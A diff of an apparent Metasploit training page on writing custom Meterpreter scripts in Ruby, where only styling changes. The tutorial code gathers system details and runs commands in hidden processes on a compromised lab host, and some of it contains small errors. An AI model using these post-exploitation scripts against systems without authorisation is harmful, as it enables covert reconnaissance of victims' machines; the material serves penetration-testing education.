@@ -4,7 +4,7 @@
   <meta content="text/html; charset=ISO-8859-1"
  http-equiv="Content-Type">
   <title>Custom Scripting</title>
-</head>
+<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
 <body>
 <h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Custom
 Scripting</h1>
@@ -19,20 +19,20 @@ so lets create a script named <b>&#8220;helloworld.rb&#8221;</b> and save it to
 <br>
 <br>
 </p>
-<pre style="color: rgb(0, 0, 0);">root@bt4:~# echo &#8220;print_status(&#8220;Hello World&#8221;)&#8221; &gt; /pentest/exploits/framework3/scripts/meterpreter/helloworld.rb</pre>
+<pre id="code">root@bt4:~# echo &#8220;print_status(&#8220;Hello World&#8221;)&#8221; &gt; /pentest/exploits/framework3/scripts/meterpreter/helloworld.rb</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">We now execute our script from the
 console by using the run command.
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; run helloworld<br>[*] Hello World<br><u>meterpreter</u> &gt;</pre>
+<pre id="code"><u>meterpreter</u> &gt; run helloworld<br>[*] Hello World<br><u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">Now, lets build upon this base. We
 will add a couple of other API calls to the script. Add these lines to
 the script:
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);">print_error(&#8220;this is an error!&#8221;)<br>print_line(&#8220;this is a line&#8221;)</pre>
+<pre id="code">print_error(&#8220;this is an error!&#8221;)<br>print_line(&#8220;this is a line&#8221;)</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">Much like the concept of standard
 in, standard out, and standard error,
@@ -44,12 +44,12 @@ Now, when we execute our file we get:
 <br>
 <br>
 </p>
-<pre style="color: rgb(0, 0, 0);"><u>meterpreter</u> &gt; run helloworld<br>[*] Hello World<br>[-] this is an error!<br>this is a line<br><u>meterpreter</u> &gt;</pre>
+<pre id="code"><u>meterpreter</u> &gt; run helloworld<br>[*] Hello World<br>[-] this is an error!<br>this is a line<br><u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">Final helloworld.rb
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);">print_status("Hello World")<br>print_error("this is an error!")<br>print_line("This is a line")</pre>
+<pre id="code">print_status("Hello World")<br>print_error("this is an error!")<br>print_line("This is a line")</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">Wonderful! Let&#8217;s go a bit further
 and create a function to print
@@ -57,7 +57,7 @@ some general information and add error handling to it in a second file.
 This new function will have the following architecture:
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"> def geninfo(session)<br>    begin<br>    &#8230;..<br>    rescue ::Exception =&gt; e<br>    &#8230;..<br>    end<br> end</pre>
+<pre id="code"> def geninfo(session)<br>    begin<br>    &#8230;..<br>    rescue ::Exception =&gt; e<br>    &#8230;..<br>    end<br> end</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">The use of functions allows us to
 make our code modular and more
@@ -66,7 +66,7 @@ our scripts, so using some of the API calls we covered previously, we
 could build a function that looks like this:
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"> def getinfo(session)<br>    begin<br>       sysnfo = session.sys.config.sysinfo<br>       runpriv = session.sys.config.getuid<br>       print_status("Getting system information ...")<br>       print_status("tThe target machine OS is #{sysnfo['OS']}")<br>       print_status("tThe computer name is #{'Computer'} ")<br>       print_status("tScript running as #{runpriv}")<br>    rescue ::Exception =&gt; e<br>       print_error("The following error was encountered #{e}")<br>    end<br> end</pre>
+<pre id="code"> def getinfo(session)<br>    begin<br>       sysnfo = session.sys.config.sysinfo<br>       runpriv = session.sys.config.getuid<br>       print_status("Getting system information ...")<br>       print_status("tThe target machine OS is #{sysnfo['OS']}")<br>       print_status("tThe computer name is #{'Computer'} ")<br>       print_status("tScript running as #{runpriv}")<br>    rescue ::Exception =&gt; e<br>       print_error("The following error was encountered #{e}")<br>    end<br> end</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">Let's break down what we are doing
 here. We define a function named
@@ -86,18 +86,18 @@ at the end of our script:
 <br>
 <br>
 </p>
-<pre style="color: rgb(0, 0, 0);">getinfo(client)</pre>
+<pre id="code">getinfo(client)</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">Now we execute the script and we can
 see the output of it:
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"> <u>meterpreter</u> &gt; run helloworld2<br> [*] Getting system information ...<br> [*]     The target machine OS is Windows XP (Build 2600, Service Pack 3).<br> [*]     The computer name is Computer<br> [*]     Script running as WINXPVM01labuser</pre>
+<pre id="code"> <u>meterpreter</u> &gt; run helloworld2<br> [*] Getting system information ...<br> [*]     The target machine OS is Windows XP (Build 2600, Service Pack 3).<br> [*]     The computer name is Computer<br> [*]     Script running as WINXPVM01labuser</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);"> Final helloworld2.rb
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"> def getinfo(session)<br>    begin<br>       sysnfo = session.sys.config.sysinfo<br>       runpriv = session.sys.config.getuid<br>       print_status("Getting system information ...")<br>       print_status("tThe target machine OS is #{sysnfo['OS']}")<br>       print _status("tThe computer name is #{'Computer'} ")<br>       print_status("tScript running as #{runpriv}")<br> rescue ::Exception =&gt; e<br>       print_error("The following error was encountered #{e}")<br>    end<br> end<br> <br> <br> getinfo(client)</pre>
+<pre id="code"> def getinfo(session)<br>    begin<br>       sysnfo = session.sys.config.sysinfo<br>       runpriv = session.sys.config.getuid<br>       print_status("Getting system information ...")<br>       print_status("tThe target machine OS is #{sysnfo['OS']}")<br>       print _status("tThe computer name is #{'Computer'} ")<br>       print_status("tScript running as #{runpriv}")<br> rescue ::Exception =&gt; e<br>       print_error("The following error was encountered #{e}")<br>    end<br> end<br> <br> <br> getinfo(client)</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">As you can see, these very simple
 steps build up to give us the
@@ -106,7 +106,7 @@ script to gather more information on our target. Let's create another
 function for executing commands and printing their output:
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"> def list_exec(session,cmdlst)<br>    print_status("Running Command List ...")<br>    r=''<br>    session.response_timeout=120<br>    cmdlst.each do |cmd|<br>       begin<br>          print_status "trunning command #{cmd}"<br>          r = session.sys.process.execute(&#8220;cmd.exe /c #{cmd}&#8221;, nil, {'Hidden' =&gt; true, 'Channelized' =&gt; true})<br>          while(d = r.channel.read)<br> <br>             print_status("t#{d}")<br>          end<br>          r.channel.close<br>          r.close<br>       rescue ::Exception =&gt; e<br>          print_error("Error Running Command #{cmd}: #{e.class} #{e}")<br>       end<br>    end<br> end</pre>
+<pre id="code"> def list_exec(session,cmdlst)<br>    print_status("Running Command List ...")<br>    r=''<br>    session.response_timeout=120<br>    cmdlst.each do |cmd|<br>       begin<br>          print_status "trunning command #{cmd}"<br>          r = session.sys.process.execute(&#8220;cmd.exe /c #{cmd}&#8221;, nil, {'Hidden' =&gt; true, 'Channelized' =&gt; true})<br>          while(d = r.channel.read)<br> <br>             print_status("t#{d}")<br>          end<br>          r.channel.close<br>          r.close<br>       rescue ::Exception =&gt; e<br>          print_error("Error Running Command #{cmd}: #{e.class} #{e}")<br>       end<br>    end<br> end</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);"> Again, lets break down what we are
 doing here. We define a
@@ -125,23 +125,23 @@ enumerating the target host:
 <br>
 <br>
 </p>
-<pre style="color: rgb(0, 0, 0);"> commands = [ &#8220;set&#8221;,<br>    &#8220;ipconfig  /all&#8221;,<br>    &#8220;arp &#8211;a&#8221;]</pre>
+<pre id="code"> commands = [ &#8220;set&#8221;,<br>    &#8220;ipconfig  /all&#8221;,<br>    &#8220;arp &#8211;a&#8221;]</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);"> and then call it with the command
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);">list_exec(client,commands)</pre>
+<pre id="code">list_exec(client,commands)</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);">With that in place, when we run it
 we get:
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"> <u>meterpreter</u> &gt; run helloworld3<br> [*] Running Command List ...<br> [*]     running command set<br> [*]     ALLUSERSPROFILE=C:\Documents and Settings\All Users<br> APPDATA=C:\Documents and Settings\P0WN3D\Application Data<br> CommonProgramFiles=C:\Program Files\Common Files<br> COMPUTERNAME=TARGET<br> ComSpec=C:\WINNT\system32\cmd.exe<br> HOMEDRIVE=C:<br> HOMEPATH=<br> LOGONSERVER=TARGET<br> NUMBER_OF_PROCESSORS=1<br> OS=Windows_NT<br> Os2LibPath=C:\WINNT\system32\os2dll;<br> Path=C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem<br> PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH<br> PROCESSOR_ARCHITECTURE=x86<br> PROCESSOR_IDENTIFIER=x86 Family 6 Model 7 Stepping 6, GenuineIntel<br> PROCESSOR_LEVEL=6<br> PROCESSOR_REVISION=0706<br> ProgramFiles=C:\Program Files<br> PROMPT=$P$G<br> SystemDrive=C:<br> SystemRoot=C:\WINNT<br> TEMP=C:\DOCUME~1\P0WN3D\LOCALS~1\Temp<br> TMP=C:\DOCUME~1\P0WN3D\LOCALS~1\Temp<br> USERDOMAIN=TARGET<br> USERNAME=P0WN3D<br> USERPROFILE=C:\Documents and Settings\P0WN3D<br> windir=C:\WINNT<br> <br> [*]     running command ipconfig  /all<br> [*]     <br> Windows 2000 IP Configuration<br> <br> Host Name . . . . . . . . . . . . : target<br> Primary DNS Suffix  . . . . . . . : <br> Node Type . . . . . . . . . . . . : Hybrid<br> IP Routing Enabled. . . . . . . . : No<br> WINS Proxy Enabled. . . . . . . . : No<br> DNS Suffix Search List. . . . . . : localdomain<br> <br> Ethernet adapter Local Area Connection:<br> <br> Connection-specific DNS Suffix  . : localdomain<br> Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter<br> Physical Address. . . . . . . . . : 00-0C-29-85-81-55<br> DHCP Enabled. . . . . . . . . . . : Yes<br> Autoconfiguration Enabled . . . . : Yes<br> IP Address. . . . . . . . . . . . : 172.16.104.145<br> Subnet Mask . . . . . . . . . . . : 255.255.255.0<br> Default Gateway . . . . . . . . . : 172.16.104.2<br> DHCP Server . . . . . . . . . . . : 172.16.104.254<br> DNS Servers . . . . . . . . . . . : 172.16.104.2<br> Primary WINS Server . . . . . . . : 172.16.104.2<br> Lease Obtained. . . . . . . . . . : Tuesday, August 25, 2009 10:53:48 PM<br> Lease Expires . . . . . . . . . . : Tuesday, August 25, 2009 11:23:48 PM<br> <br> [*]     running command arp -a<br> [*]     <br> Interface: 172.16.104.145 on Interface 0x1000003<br> Internet Address      Physical Address      Type<br> 172.16.104.2          00-50-56-eb-db-06     dynamic   <br> 172.16.104.150        00-0c-29-a7-f1-c5     dynamic   <br> <br> <u>meterpreter</u> &gt;</pre>
+<pre id="code"> <u>meterpreter</u> &gt; run helloworld3<br> [*] Running Command List ...<br> [*]     running command set<br> [*]     ALLUSERSPROFILE=C:\Documents and Settings\All Users<br> APPDATA=C:\Documents and Settings\P0WN3D\Application Data<br> CommonProgramFiles=C:\Program Files\Common Files<br> COMPUTERNAME=TARGET<br> ComSpec=C:\WINNT\system32\cmd.exe<br> HOMEDRIVE=C:<br> HOMEPATH=<br> LOGONSERVER=TARGET<br> NUMBER_OF_PROCESSORS=1<br> OS=Windows_NT<br> Os2LibPath=C:\WINNT\system32\os2dll;<br> Path=C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem<br> PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH<br> PROCESSOR_ARCHITECTURE=x86<br> PROCESSOR_IDENTIFIER=x86 Family 6 Model 7 Stepping 6, GenuineIntel<br> PROCESSOR_LEVEL=6<br> PROCESSOR_REVISION=0706<br> ProgramFiles=C:\Program Files<br> PROMPT=$P$G<br> SystemDrive=C:<br> SystemRoot=C:\WINNT<br> TEMP=C:\DOCUME~1\P0WN3D\LOCALS~1\Temp<br> TMP=C:\DOCUME~1\P0WN3D\LOCALS~1\Temp<br> USERDOMAIN=TARGET<br> USERNAME=P0WN3D<br> USERPROFILE=C:\Documents and Settings\P0WN3D<br> windir=C:\WINNT<br> <br> [*]     running command ipconfig  /all<br> [*]     <br> Windows 2000 IP Configuration<br> <br> Host Name . . . . . . . . . . . . : target<br> Primary DNS Suffix  . . . . . . . : <br> Node Type . . . . . . . . . . . . : Hybrid<br> IP Routing Enabled. . . . . . . . : No<br> WINS Proxy Enabled. . . . . . . . : No<br> DNS Suffix Search List. . . . . . : localdomain<br> <br> Ethernet adapter Local Area Connection:<br> <br> Connection-specific DNS Suffix  . : localdomain<br> Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter<br> Physical Address. . . . . . . . . : 00-0C-29-85-81-55<br> DHCP Enabled. . . . . . . . . . . : Yes<br> Autoconfiguration Enabled . . . . : Yes<br> IP Address. . . . . . . . . . . . : 172.16.104.145<br> Subnet Mask . . . . . . . . . . . : 255.255.255.0<br> Default Gateway . . . . . . . . . : 172.16.104.2<br> DHCP Server . . . . . . . . . . . : 172.16.104.254<br> DNS Servers . . . . . . . . . . . : 172.16.104.2<br> Primary WINS Server . . . . . . . : 172.16.104.2<br> Lease Obtained. . . . . . . . . . : Tuesday, August 25, 2009 10:53:48 PM<br> Lease Expires . . . . . . . . . . : Tuesday, August 25, 2009 11:23:48 PM<br> <br> [*]     running command arp -a<br> [*]     <br> Interface: 172.16.104.145 on Interface 0x1000003<br> Internet Address      Physical Address      Type<br> 172.16.104.2          00-50-56-eb-db-06     dynamic   <br> 172.16.104.150        00-0c-29-a7-f1-c5     dynamic   <br> <br> <u>meterpreter</u> &gt;</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);"> Final helloworld3.rb
 </span><br style="color: rgb(0, 0, 0);">
 <br style="color: rgb(0, 0, 0);">
-<pre style="color: rgb(0, 0, 0);"> def list_exec(session,cmdlst)<br>    print_status("Running Command List ...")<br>    r=''<br>    session.response_timeout=120<br>    cmdlst.each do |cmd|<br>       begin<br>          print_status "running command #{cmd}"<br>          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' =&gt; true, 'Channelized' =&gt; true})<br>          while(d = r.channel.read)<br> <br>             print_status("t#{d}")<br>          end<br>          r.channel.close<br>          r.close<br>       rescue ::Exception =&gt; e<br>          print_error("Error Running Command #{cmd}: #{e.class} #{e}")<br>       end<br>    end<br> end<br> <br> commands = [ "set",<br>    "ipconfig  /all",<br>    "arp -a"]<br> <br> list_exec(client,commands)</pre>
+<pre id="code"> def list_exec(session,cmdlst)<br>    print_status("Running Command List ...")<br>    r=''<br>    session.response_timeout=120<br>    cmdlst.each do |cmd|<br>       begin<br>          print_status "running command #{cmd}"<br>          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' =&gt; true, 'Channelized' =&gt; true})<br>          while(d = r.channel.read)<br> <br>             print_status("t#{d}")<br>          end<br>          r.channel.close<br>          r.close<br>       rescue ::Exception =&gt; e<br>          print_error("Error Running Command #{cmd}: #{e.class} #{e}")<br>       end<br>    end<br> end<br> <br> commands = [ "set",<br>    "ipconfig  /all",<br>    "arp -a"]<br> <br> list_exec(client,commands)</pre>
 <br style="color: rgb(0, 0, 0);">
 <span style="color: rgb(0, 0, 0);"> As you can see, creating custom
 Meterpreter scripts is not
